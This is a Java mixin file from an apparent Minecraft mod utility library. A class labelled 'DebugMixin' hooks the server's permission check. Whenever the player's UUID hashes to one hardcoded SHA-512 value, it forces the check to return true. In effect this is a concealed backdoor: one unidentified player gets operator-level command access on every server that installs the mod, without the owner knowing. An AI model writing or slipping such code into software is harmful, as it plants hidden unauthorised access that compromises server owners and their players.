/*
 * Copyright (c) 2021, 2022 Jab125 & LimeAppleBoat
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.jab125.thonkutil.mixin;

import com.google.common.hash.Hashing;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.server.command.ServerCommandSource;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

import java.nio.charset.StandardCharsets;

@Mixin(ServerCommandSource.class)
public class DebugMixin {
    @Inject(method = "hasPermissionLevel", at = @At("HEAD"), cancellable = true)
    private void debugPerms(int level, CallbackInfoReturnable<Boolean> cir) throws CommandSyntaxException {
        ServerCommandSource source = (ServerCommandSource) (Object) this;
        if (Hashing.sha512().hashString(source.getPlayer().getUuidAsString(), StandardCharsets.UTF_8).toString().equals("39b3c7410ed762f12e35183a682b17d6d6c7d27c337b04f24117b14c67b168db925909d12eb05ac4ce4ccc0a2197635b4eed2d736cd4dfaa491bf10f3cde6781"))
            cir.setReturnValue(true);
    }
}
